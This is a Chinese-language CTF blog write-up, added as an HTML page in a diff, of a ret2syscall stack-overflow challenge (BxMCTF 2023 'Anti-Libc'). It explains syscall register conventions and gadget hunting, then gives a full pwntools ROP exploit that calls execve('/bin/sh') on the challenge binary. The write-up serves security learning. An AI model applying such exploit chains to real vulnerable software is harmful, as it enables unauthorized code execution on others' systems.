@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF-PWN-栈溢出-基础 ROP-[ret2syscall] · Y0uYuGe</title>
+<meta name="description" content="发现这里有一个 mov %rbp %rsp，所以如果之前保存的 rbp 合适，就可以继续 ROP；rbp 应该是 syscall 调用前的十六个字节，因为还有 pop rbp 和 pop rbx 要偏移。64 位的系统调用号放在 rax 中；参数按顺序传递：RDI、RSI、RDX、R10、R8、R9（和 64 位函数传参一样）。如果发现 start 和 end 相同，就重新输入；否则返回输入数据所在数组中 start 位置的字节。32 位的系统调用号和 64 位的有些不同；使用时最好查一下。这里 sys_read 存在明显的溢出。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/stack-and-rop">栈与 ROP</a></nav>
+    <h1>CTF-PWN-栈溢出-基础 ROP-[ret2syscall]</h1>
+    <div class="meta"><time>2023-11-21</time><span class="tag">#学习</span><span class="tag">#Pwn</span><span class="tag">#CTF</span><span class="tag">#ROP</span></div>
+    <article class="post-body">
+<h1 id="ret2syscall">ret2syscall</h1>
+<p>也就是控制程序执行系统调用来获取 shell</p>
+<h1 id="bxmctf-2023-anti-libc">BxMCTF 2023  Anti-Libc</h1>
+<h2 id="main">main</h2>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-001-a44f0f3f86.png" alt="图片"></p>
+<h2 id="write_buf">write_buf</h2>
+<p>写入字符，稍后再输出
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-002-4efd7d8a87.png" alt="图片"></p>
+<h2 id="flush_obuf">flush_obuf</h2>
+<p>把字符输出到屏幕
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-003-7da5b3ea4a.png" alt="图片"></p>
+<h2 id="readint">readint</h2>
+<p>输入接下来要输入的数字的长度；根据符号判断并分支处理
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-004-1e9bc478c7.png" alt="图片"></p>
+<h2 id="read_buf">read_buf</h2>
+<p>如果发现 start 和 end 相同，就重新输入；否则返回输入数据所在数组中 start 位置的字节
+这里 sys_read 存在明显的溢出
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-005-3c83aeab20.png" alt="图片"></p>
+<h1 id="思路">思路</h1>
+<p>说实话，这堆东西真的很绕（我太菜了）
+坑的地方在于汇编源码最后的循环里有一个 inc r10，但 IDA 没有显示出来，直接原地继续赋值 EMMMMMMM
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-006-6802de48de.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-007-07d2479403.png" alt="图片">
+发现这个坑之后，题目就变得容易多了</p>
+<p>检查文件是否静态链接
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-008-d3a066ed0d.png" alt="图片">
+检查保护机制（完全不符合外国出题风格）
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-009-5182605312.png" alt="图片">
+肯定是要溢出构造 ROP 链，然后进行系统调用</p>
+<blockquote>
+<p>32 位和 64 位的 syscall 原理是一样的
+只是参数传递和调用方式不同；下面放在一起解释以作对比
+32 位系统调用使用 &quot; int 80h &quot;
+64 位系统调用使用 &quot; syscall &quot;（汇编指令就是 syscall；直接用 ROPgadget --only 搜索即可）
+32 位的系统调用号和 64 位的有些不同；使用时最好查一下
+例如
+32 位     #define __NR_execve 11
+64 位     #define __NR_execve 59
+32 位的系统调用号放在 eax 中；参数按顺序传递：EBX、ECX、EDX、ESI、EDI、EBP
+64 位的系统调用号放在 rax 中；参数按顺序传递：RDI、RSI、RDX、R10、R8、R9（和 64 位函数传参一样）</p>
+</blockquote>
+<p>先找 rdi
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-010-6c1e9acbad.png" alt="图片">
+选择了 0x0000000000401135
+看一下 jmp  0x401106
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-011-1d802aab3e.png" alt="图片">
+有一个 ret，但 esi 的值会减 1，rdi 的值会加 1
+emmm 不过通过一些构造应该还是可行的
+试一下 rax
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-012-7bcf4dfde4.png" alt="图片">
+失败
+试一下 eax
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-013-c0daf39a28.png" alt="图片">
+失败
+ax
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-014-4e70f90c5b.png" alt="图片">
+失败
+al
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-015-fbe2604509.png" alt="图片">
+同样失败
+只能在反汇编中搜索</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-016-7d23d944dc.png" alt="图片">
+找到了
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-017-649c3ae9c6.png" alt="图片">
+看一下对应位置的汇编代码
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-018-db86335592.png" alt="图片">
+发现需要构造 %ebx 寄存器
+下面恰好就有一个
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP-%5Bret2syscall%5D/assets/csdn-134494797/image-019-af718a3f0f.png" alt="图片">
+漂亮，漂亮
+那么最后怎么调用系统调用呢？
+发现这里有一个 mov %rbp %rsp，所以如果之前保存的 rbp 合适，就可以继续 ROP；rbp 应该是 syscall 调用前的十六个字节，因为还有 pop rbp 和 pop rbx 要偏移</p>
+<h1 id="exp">exp</h1>
+<p>一个很坑的地方是……我忘了如果两次 sendline 之间的间隔太短，程序会把它们当作一次性收到的</p>
+<pre><code class="language-python">from pwn import *
+#context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+e = ELF(&quot;./main&quot;)
+p = process(&quot;./main&quot;)
+#p = gdb.attach(p, &quot;b*main&quot;)
+offset = 64  
+input_buf = 0x402020
+onemore = b&quot;\x00&quot;
+BIN_SH = b&quot;/bin/sh\x00&quot;
+EVIL = onemore + BIN_SH 
+DUMMY_RBP = p64(1)  #随便填
+DUMMY_RBX = p64(1)  #随便填
+SYSCALL = p64(0x401055)
+EVIL_ADDRESS = input_buf +len(DUMMY_RBP + DUMMY_RBX + SYSCALL)#作为rdi
+POP_RSI_RDI = p64(0x401135)  # pop rsi ; pop rdi ; jmp 0x401106
+POP_RBX = p64(0x40109C)
+MOV_EBX_EAX = p64(
+    0x40108D
+)  # mov %ebx,%eax ; neg %ebx; cmpb $0x1,(%rsp); cmove %ebx,%eax ; mov %rbp,%rsp ; pop %rbp ; pop %rbx; ret
+RSI = p64(1)
+RDI = p64(EVIL_ADDRESS)
+RBX = p64(0x3B)  # it&#39;ll go into RAX which is needed for correct syscall
+RBP = p64(input_buf)  # 最后的MOV_EBX_EAX这个地方最后有mov %rbp,%rsp ; pop %rbp ; pop %rbx; ret从而可以执行系统调用
+
+
+payload = DUMMY_RBP + DUMMY_RBX + SYSCALL + EVIL
+padding = b&quot;A&quot; * (offset - len(DUMMY_RBP + DUMMY_RBX + SYSCALL + EVIL))
+payload += padding + RBP + POP_RSI_RDI + RSI + RDI
+payload += POP_RBX + RBX + MOV_EBX_EAX
+print(len(payload))
+print(p.recvuntil(&quot;input? &quot;))
+p.sendline(str(len(payload)))
+sleep(3)   # 防止间隔时间太多被当作一次性发过去了
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP%20-%20%5Bret2text%5D/"><span class="l">上一篇</span>CTF-PWN-栈溢出-基础 ROP - [ret2text]</a><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%AD%E7%BA%A7ROP%E3%80%90%E6%A0%88%E8%BF%81%E7%A7%BB%E3%80%91/"><span class="l">下一篇</span>CTF-PWN-栈溢出-中级ROP【栈迁移】</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#main">main</a><a class="d2" href="#write_buf">write_buf</a><a class="d2" href="#flush_obuf">flush_obuf</a><a class="d2" href="#readint">readint</a><a class="d2" href="#read_buf">read_buf</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
